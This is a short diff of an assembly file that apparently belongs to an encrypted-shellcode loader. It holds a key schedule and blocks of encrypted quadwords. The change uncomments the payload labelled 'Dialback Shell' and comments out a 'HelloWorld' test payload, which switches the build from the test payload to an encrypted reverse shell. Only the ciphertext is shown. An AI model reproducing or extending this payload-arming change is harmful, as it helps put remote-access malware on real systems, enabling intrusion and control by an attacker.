@@ -17,7 +17,6 @@ key_schedule:
 	.quad 0xc1d38f0297b36395, 0xff5fe2ff496d7f41
 
 ctext:   // Dialback Shell                 
-    /*
     .quad 0x4cc5fabc529c7f72, 0xb246bf9a072691c4
     .quad 0x1614ea67fb81667a, 0x1cbbdca18b115764
     .quad 0x9fa8b87d5a7886ff, 0xb8b899864bb7d446
@@ -42,8 +41,8 @@ ctext:   // Dialback Shell
     .quad 0x5e84184c9b029bda, 0x981679679a0ac158
     .quad 0x9eb6a5d82e722bc8, 0xe20840570ae87af3
     .quad 0x593c47a7ececca83, 0x2f43eecde3d637ca
-    */
 
+    /*
     // HelloWorld (test SPASM) 
     .quad 0x4cc5fabc529c7f72, 0xb246bf9a072691c4
     .quad 0x1614ea67fb81667a, 0x1cbbdca18b115764
@@ -61,6 +60,7 @@ ctext:   // Dialback Shell
     .quad 0xcfc27d8d6e03f698, 0x0e079ebf0f9b9ccb
     .quad 0x643e28e657ebc3b4, 0xa7df4ce2d0ac1532
     .quad 0xbfad647b80e57b81, 0xc297cb548e0972b9
+    */
 
 
 
